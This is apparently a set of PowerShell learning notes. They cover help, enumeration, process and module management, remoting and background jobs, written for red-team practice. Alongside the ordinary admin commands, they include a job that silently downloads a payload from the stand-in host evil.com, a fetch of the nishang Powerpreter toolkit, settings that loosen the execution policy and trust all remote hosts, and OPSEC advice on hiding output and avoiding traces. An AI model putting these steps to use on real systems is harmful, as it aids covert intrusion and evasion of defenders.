# 🧠 PowerShell Basics – Help & Discovery

## 📘 Get-Help
Displays detailed information about PowerShell cmdlets (commands).

U sage:
```powershell
Get-Help <cmdlet-name>
```

Example:
```powershell
Get-Help Get-Process
```

Online help:
```powershell
Get-Help Get-Process -Online
```

Search help topics by keyword:
```powershell
Get-Help *process*
Get-Help service
```

---

## 🔍 Get-Alias
Shows the aliases (shortcuts) for PowerShell cmdlets.

Example:
```powershell
Get-Alias
```

Note:
Useful to understand shortcuts like:
- `ls` is alias for `Get-ChildItem`
- `gci` is also alias for `Get-ChildItem`

---

## 📂 Get-ChildItem
Lists the contents of a directory (similar to `ls` in Linux or `dir` in CMD).

Example 1 – Filter by name:
```powershell
Get-ChildItem 'C:\Program Files\' -Filter windows*
```

Example 2 – List hidden items:
```powershell
Get-ChildItem -Path C:\ -Attributes h
```

Note:
- `-Recurse` can be used to list all subdirectories.
- Useful for file discovery and enumeration.

---


 # ⚙️ PowerShell – Commands, Process Management & File Copy

## 🔎 Get-Command

### 🔍 Search for cmdlets related to "service"
```powershell
Get-Command -Type Cmdlet -Name *service*
```

### 📊 Count all available cmdlets
```powershell
Get-Command -Type Cmdlet | Measure-Object
```

### 🔎 List all cmdlets with verb "Start"
```powershell
Get-Command -Verb start
```

Useful for discovering automation commands like `Start-Service`, `Start-Process`, etc.

---

## 🧠 Process Management

### 🔍 Search for processes with a name containing "exp"
```powershell
Get-Process -Name *exp*
```

Example Output:
```
Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
   2763     120   121196     171608     210.11  17136  17 explorer
    741      34    30956      59948       3.72  15712  17 ShellExperienceHost
    629      32    22944      70608       4.39  16904  17 StartMenuExperienceHost
```

---

### ▶️ Start a new process (Notepad)
```powershell
Start-Process notepad
```

### 📋 Get info about Notepad process
```powershell
Get-Process -Name notepad
```

Example Output:
```
Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
    243      13     3148      14764       0.09   7176  17 notepad
```

### ⛔ Stop a running process (by ID)
```powershell
Stop-Process -Id 7176
```

---

## 📁 File Operations – Copy File

### 📂 Copy a file to another location
```powershell
Copy-Item test.txt C:\Users\APT_1337\Downloads\
```



## 📁 File & Directory Enumeration

### 📂 List all items in the current directory (names only)
```powershell
Get-ChildItem | Format-Table -Property Name
```

---

### 📂 Detailed list of all items (List format)
```powershell
Get-ChildItem | Format-List
```

---

### 📂 Export item names to a text file
```powershell
Get-ChildItem | Format-Table -Property Name | Out-File ./Items.txt
```

---

### 🙈 List hidden files and export their names
```powershell
Get-ChildItem -Attributes h | Format-Table -Property Name | Out-File ./HiddenItems.txt
```
> 💡 Useful in Red Team operations to find hidden artifacts or tools left by attackers or admins.

---

### 🔐 List files with their Mode (e.g., hidden, read-only)
```powershell
Get-ChildItem | Format-Table -Property Name, Mode
```
> 💡 Helps identify restricted or protected files (e.g., `r--h--`).

---

### 🧩 List only file extensions in the directory
```powershell
Get-ChildItem | Format-Table -Property Extension
```
> 💡 Can be filtered to find scripts or executables: `.ps1`, `.bat`, `.exe`.

---

## 🧠 Process Enumeration

### ⚙️ List all running processes (Name + PID)
```powershell
Get-Process | Format-Table -Property Name, Id
```

---

### ⚙️ Export process names and IDs to a file
```powershell
Get-Process | Format-Table -Property Name, Id | Out-File ./ProcessNID.txt
```
> 💡 Helpful for identifying AV/EDR processes like `MsMpEng`, `csrss`, or suspicious binaries.

---

### 🔍 Show process info in detailed list format
```powershell
Get-Process | Format-List -Property Name, Id
```

# 🧰 PowerShell Module & Execution Policy Management

---

## 🔐 Execution Policy

### ▶️ View the current execution policy
```powershell
Get-ExecutionPolicy
```
- Displays the current policy (e.g., `Restricted`, `RemoteSigned`, `Unrestricted`).

---

### 🛠️ Change execution policy for the current user
```powershell
Set-ExecutionPolicy -Scope CurrentUser Unrestricted
```
- Allows unrestricted script execution for the current user only.
- ⚠️ Use with caution in secure environments.

---

## 📦 Modules – Managing PowerShell Modules

### 📂 List all modules loaded in the current session
```powershell
Get-Module -All
```
- Shows all modules loaded (whether actively imported or not).

---

### 🔍 List all available modules on the system (not necessarily imported)
```powershell
Get-Module -ListAvailable -All
```
- Lists all modules found in directories from `$env:PSModulePath`.

---

### 🌐 Download a module script from the internet
```powershell
Invoke-WebRequest -Uri https://raw.githubusercontent.com/samratashok/nishang/refs/heads/master/powerpreter/Powerpreter.psm1 -OutFile Powerpreter.psm1
```
- Downloads the Powerpreter module from GitHub and saves it locally.

---

### 📥 Import a PowerShell module into the current session
```powershell
Import-Module .\Powerpreter.psm1
```
- Loads the module into the session so you can use its functions and commands.

---

### 🧹 Remove a module from the current session
```powershell
Remove-Module Powerpreter
```
- Unloads the module from memory (does not delete the file from disk).

---

## 📚 Additional Useful Commands

### 🧱 Create a custom module directory
```powershell
New-Item -Path "$HOME\Documents\PowerShell\Modules\MyModule" -ItemType Directory
```

---

### 📝 Create a module manifest (.psd1 file)
```powershell
New-ModuleManifest -Path "$HOME\Documents\PowerShell\Modules\MyModule\MyModule.psd1" -RootModule "MyModule.psm1"
```

---

### 📄 View details about a loaded module
```powershell
Get-Module Powerpreter | Format-List *
```

---

## 🧠 Notes

- It's best practice to create a folder named after your module and store `.psm1` and `.psd1` files inside it.
- Make sure your module folder is located within one of the paths in `$env:PSModulePath`.
- To update a module, delete the old file from disk and re-import the new one using `Import-Module`.
- 

# 💻 PowerShell Remoting 
---

## 🔧 1. Enabling PowerShell Remoting on the Target Machine

Run this on the **target Windows machine** (as Administrator):

Enable-PSRemoting -Force

📘 This enables WinRM, configures the firewall, and sets up the listener to accept remote PowerShell sessions.

---

## 🛠 2. Allowing Connections by IP (Optional for Lab Setup)

If you're connecting using an IP address instead of hostname (common in labs):

Set-Item WSMan:\localhost\Client\TrustedHosts -Value "*" -Force

📘 Allows connecting to any IP address. You can also specify an IP instead of *.

---

## 🔐 3. Setting the WinRM Service to Auto Start

Set-Service -Name WinRM -StartupType Automatic
Start-Service WinRM

📘 Ensures that the WinRM service starts automatically after reboot.

---

## 🤝 4. Connecting to a Remote System

### Using Enter-PSSession for Interactive Shell:

Enter-PSSession -ComputerName 192.168.1.10 -Credential (Get-Credential)

📘 Starts an interactive remote session. You'll be prompted for credentials.

---

### Using Invoke-Command for One-Liners:

Invoke-Command -ComputerName 192.168.1.10 -Credential (Get-Credential) -ScriptBlock { Get-Process }

📘 Executes a one-time command on the remote system and returns the result.

---

## 🧪 5. Useful Invoke-Command Examples

### Get System Info from Remote Machine

Invoke-Command -ComputerName 192.168.1.10 -Credential (Get-Credential) -ScriptBlock { systeminfo }

### Get List of Services

Invoke-Command -ComputerName 192.168.1.10 -Credential (Get-Credential) -ScriptBlock { Get-Service }

### Get Logged In User

Invoke-Command -ComputerName 192.168.1.10 -Credential (Get-Credential) -ScriptBlock { whoami }




# 🧠 PowerShell 


---

## ⚙️ What Are PowerShell Jobs?

PowerShell **Jobs** are background processes that allow you to execute commands **asynchronously**, meaning they won’t block the main PowerShell session. They’re particularly useful when:
- Executing long-running commands
- Hiding enumeration or payloads from the user’s console
- Reducing operational footprint (OPSEC)

---

## 🛠️ Essential PowerShell Job Commands

### ▶️ Start a job in the background

Start-Job -ScriptBlock { COMMAND }

### 📄 View all running or completed jobs

Get-Job

### 📥 Receive the output of a job

Receive-Job -Id  id;

### 🧼 Remove a specific job

Remove-Job -Id  id ;

### ❌ Remove all jobs

Get-Job | Remove-Job

### 🔍 Find cmdlets that support `-AsJob`

Get-Command -ParameterName AsJob

### ▶️ Example: Run a supported command as a job

Get-Process -Name explorer -AsJob

---

## 🧪 Red Team Examples Using PowerShell Jobs

| 🎯 Objective | 💻 Job Example |
|-------------|----------------|
| **Silent Enumeration** | Start-Job { Get-ADUser -Filter * } |
| **Download Payload Silently** | Start-Job { Invoke-WebRequest -Uri "http://evil.com/payload.exe" -OutFile "$env:TEMP\payload.exe" } |
| **Run Recon Tool in Background** | Start-Job { nmap -sS 10.0.0.0/24 -oN C:\Users\Public\scan.txt } |
| **Dump Local Admins** | Start-Job { Get-NetLocalGroupMember -GroupName "Administrators" | Out-File C:\Users\Public\admins.txt } |

---

## 🔐 OPSEC Considerations

- ✅ Always **clean up jobs** after completion:

  Get-Job | Remove-Job

- ✅ Save output to **non-suspicious locations**:
  - %TEMP%
  - %APPDATA%
  - C:\ProgramData
  - C:\Users\Public

- ✅ Avoid leaving traces:
  - Redirect output to memory or remote listener if possible
  - Remove temporary files after use

---

## 🧩 Pro Tips

- Combine with Scheduled Tasks, .NET, or WMI for advanced persistence.
- Chain jobs to run multiple stages of an attack asynchronously.
- Use `-AsJob` when supported for native job handling.




 
